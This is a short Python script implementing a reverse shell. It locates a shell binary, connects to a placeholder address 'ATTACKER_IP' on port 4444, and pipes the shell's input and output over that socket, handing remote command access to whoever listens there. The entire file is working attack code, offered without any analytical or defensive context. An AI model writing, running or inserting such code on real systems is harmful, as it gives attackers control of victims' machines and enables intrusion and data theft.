import socket
import subprocess
import os

# A list of commonly available shells
shells = ['/bin/bash', '/bin/sh', '/bin/ash', '/bin/zh']

# Try each shell until one is found
shell = None
for s in shells:
    if os.path.exists(s):
        shell = s
        break

# Connect to the attacker's machine
attacker_address = ('ATTACKER_IP', 4444)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(attacker_address)

# Create a subprocess to interact with the command line
if shell:
    p = subprocess.Popen([shell], stdin=sock, stdout=sock, stderr=sock)
    p.wait()
else:
    print("Error: No available shell found")